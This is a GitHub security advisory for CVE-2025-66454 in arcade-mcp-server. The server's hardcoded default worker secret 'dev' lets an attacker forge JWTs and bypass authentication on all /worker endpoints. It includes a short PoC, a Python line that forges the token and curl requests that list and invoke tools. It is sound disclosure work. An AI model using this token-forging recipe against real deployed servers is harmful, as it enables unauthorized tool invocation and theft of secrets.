# [M] arcade-mcp-server Has Default Hardcoded Worker Secret That Allows Full Unauthorized Access to All HTTP MCP Worker Endpoints

## Summary
Severity: Medium
Advisory: GHSA-g2jx-37x6-6438
CVE: CVE-2025-66454
CWE: CWE-284, CWE-321
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2025-12-02
Source: https://github.com/advisories/GHSA-g2jx-37x6-6438
Type: github-advisory

## Affected
- PyPI: `arcade-mcp-server` — affected >=0 <1.9.1

## Details
### Summary

The arcade-mcp HTTP server uses a hardcoded default worker secret ("dev") that is never validated or overridden during normal server startup. As a result, any unauthenticated attacker who knows this default key can forge valid JWTs and fully bypass the FastAPI authentication layer. This grants remote access to all worker endpoints—including tool enumeration and tool invocation—without credentials.

Anyone following the official quick-start guide is vulnerable unless they manually override ARCADE_WORKER_SECRET.

### Details

The documented method for launching an HTTP MCP server (python server.py http) implicitly sets the worker secret to the hardcoded default "dev":

ArcadeSettings.server_secret defaults to "dev"
(libs/arcade-mcp-server/arcade_mcp_server/settings.py:129–158)

create_arcade_mcp() passes this value directly to FastAPIWorker without validation
(libs/arcade-mcp-server/arcade_mcp_server/worker.py:118–188)

BaseWorker._set_secret() accepts this value and does not enforce rotation
(libs/arcade-serve/arcade_serve/core/base.py:42–83)

Because the worker’s signing key is constant and publicly documented, attackers can trivially generate valid HS256 JWTs:

The FastAPI worker auth middleware (arcade_serve/fastapi/auth.py) trusts any JWT signed with the worker secret.

The core auth layer (arcade_serve/core/auth.py) does not distinguish forged tokens from legitimate ones.

The official quick-start instructions (README.md:164–190) demonstrate launching an MCP server without mentioning worker-secret rotation. Users are told how to define tool secrets in .env, but not that the worker’s authentication key must be changed.

As a result, servers deployed following the documented workflow expose all /worker/* endpoints to anyone capable of generating a simple HS256 token using the known key.

This CVE was resolved by https://github.com/ArcadeAI/arcade-mcp/pull/691

### PoC

Start the server using the official guide
https://docs.arcade.dev/en/home/build-tools/create-a-mcp-server

Verify that unauthenticated access is rejected (expected)
```
curl -s -D - http://127.0.0.1:8000/worker/tools
# → 403 Forbidden
```

Forge a valid HS256 token using the hardcoded default secret "dev"
```
import jwt
print(jwt.encode({'ver': '1', 'aud': 'worker'}, 'dev', algorithm='HS256'))
```

Use the forged token to bypass authentication
```
curl -s -D - \
  -H "Authorization: Bearer $(cat /tmp/forged_token.txt)" \
  http://127.0.0.1:8000/worker/tools
```

Result:
The server responds 200 OK with the full tool catalog and allows invocation of all worker tools.

Server logs show a rejected request immediately followed by a successful forged request, confirming the bypass.

### Impact

This is an authentication bypass that results in full remote access to all MCP worker endpoints:

Unauthenticated attackers can enumerate tools

Invoke arbitrary tools remotely

Access any data returned by tools (including secrets loaded into ToolContext)

Execute actions inside internal systems if tools expose operational capabilities

Perform these actions without any brute forcing or guesswork due to the known default signing key

Any user who follows the official setup guide is exposed unless they manually override ARCADE_WORKER_SECRET, which is not documented.

This vulnerability effectively gives complete remote control over the MCP worker API to any attacker aware of the default key.

## References
- https://github.com/ArcadeAI/arcade-mcp/security/advisories/GHSA-g2jx-37x6-6438
- https://nvd.nist.gov/vuln/detail/CVE-2025-66454
- https://github.com/ArcadeAI/arcade-mcp/pull/691
- https://github.com/ArcadeAI/arcade-mcp/commit/44660d18ceb220600401303df860a31ca766c817
- https://github.com/ArcadeAI/arcade-mcp/commit/7fb097f20fbea35e382a1b78da6fd90609c55a9e
- https://github.com/ArcadeAI/arcade-mcp
